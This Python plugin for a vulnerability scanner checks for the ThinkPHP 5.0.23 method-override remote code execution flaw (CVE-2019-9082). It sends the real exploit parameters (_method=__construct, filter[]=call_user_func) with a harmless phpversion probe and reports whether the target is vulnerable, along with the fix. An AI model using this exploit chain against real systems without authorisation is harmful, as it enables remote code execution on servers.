# ThinkPHP 5.0.23 _request_method 覆盖 RCE：/index.php?s=captcha
# 利用 _method=__construct 覆盖 Request 对象的 method/filter，使 filter 成为 call_user_func
# 本插件仅做存在性验证：以 phpversion() 作为探针函数，检测响应特征。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url
from lib.matcher import match_php_eval_response

# 漏洞命中签名（与 lab/thinkphp_server.py vuln 模式一致）
RCE_MARKER = 'thinkphp-5023-construct-rce-confirmed'


class ThinkphpMethodConstructRcePlugin(PluginBase):
    name = 'ThinkPHP 5.0.23 method 覆盖远程代码执行'
    cve = 'CVE-2019-9082'
    severity = 'high'
    category = 'vuln'
    description = '5.0.23 版本 Request 类 _method=__construct 覆盖 method/filter，' \
                  '使 filter[]=call_user_func 接管输入过滤执行任意函数'
    fix = '升级 ThinkPHP 至 5.0.24+；禁用 method 覆盖；开启强制路由'

    def verify(self, target, session):
        url = join_url(target, '/index.php')
        # 真实利用链参数（探针仅触发 phpversion，不执行破坏性命令）
        data = {
            '_method': '__construct',
            'method': 'get',
            'filter[]': 'call_user_func',
            'get[]': 'phpversion',
        }
        try:
            resp = session.post(url + '?s=captcha', data=data)
        except Exception as e:
            print(no('ThinkPHP 5.0.23 method 覆盖 RCE（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        # 判定：签名靶场 marker 命中 OR 真实漏洞响应（phpinfo/phpversion 求值结果）
        if RCE_MARKER in text:
            print(ok('存在 ThinkPHP 5.0.23 method 覆盖远程代码执行漏洞'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含 method 覆盖 RCE 特征：{RCE_MARKER}',
                fix=self.fix,
            )
        if match_php_eval_response(text):
            print(ok('存在 ThinkPHP 5.0.23 method 覆盖远程代码执行漏洞（真实漏洞响应）'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence='响应含 PHP 函数求值结果（phpinfo/phpversion），证实 method 覆盖 RCE 可达',
                fix=self.fix,
            )
        print(no('不存在 ThinkPHP 5.0.23 method 覆盖远程代码执行漏洞'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含 RCE 特征（可能已修复或接口不可达）')
